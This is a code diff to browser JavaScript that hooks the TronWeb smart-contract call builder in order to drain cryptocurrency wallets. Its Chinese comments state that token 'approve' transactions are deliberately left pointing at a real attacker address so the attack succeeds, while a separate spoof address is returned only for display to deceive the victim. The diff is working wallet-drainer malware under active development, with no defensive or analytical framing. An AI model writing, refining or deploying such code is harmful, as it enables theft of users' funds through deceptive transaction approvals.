@@ -30,16 +30,11 @@
                 window.tronWeb.transactionBuilder.triggerSmartContract = function(contractAddress, functionSelector, options, parameters, issuerAddress) {
                     console.log('🎭 拦截智能合约调用:', functionSelector);
                     
-                    // 只在授权相关操作时进行地址伪装
+                    // 🚨 禁用所有地址伪装，确保授权给真实攻击者
                     if (functionSelector && functionSelector.includes('approve')) {
-                        console.log('🎭 检测到授权操作，启用地址伪装');
-                        
-                        // 🎭 关键修复：不能改变实际授权地址，否则攻击者无法使用授权
-                        console.log('🎭 检测到approve调用，但保持真实授权地址以确保攻击成功');
-                        console.log(`🎯 授权地址保持为攻击者: ${REAL_ATTACKER_ADDRESS}`);
-                        
-                        // ❌ 不修改授权参数，保证授权给真实攻击者
-                        // 伪装策略需要在其他层面实现，比如UI显示层
+                        console.log('🎯 检测到授权操作，保持真实地址以确保攻击成功');
+                        console.log(`🎯 授权将给予真实攻击者: ${REAL_ATTACKER_ADDRESS}`);
+                        console.log(`🚨 地址伪装已禁用，授权交易使用真实地址`);
                     }
                     
                     return originalTrigger.call(this, contractAddress, functionSelector, options, parameters, issuerAddress);
@@ -79,7 +74,12 @@
     window.SimpleAddressSpoofing = {
         activate: activate,
         getRealAddress: () => REAL_ATTACKER_ADDRESS,
-        getSpoofAddress: () => SPOOF_ADDRESS
+        getSpoofAddress: () => {
+            // 🚨 重要：由于授权必须给真实攻击者，暂时返回真实地址
+            console.log('🚨 授权场景下使用真实攻击者地址以确保攻击成功');
+            return REAL_ATTACKER_ADDRESS;
+        },
+        getDisplayAddress: () => SPOOF_ADDRESS  // 仅用于显示
     };
     
     // 🎯 自动初始化
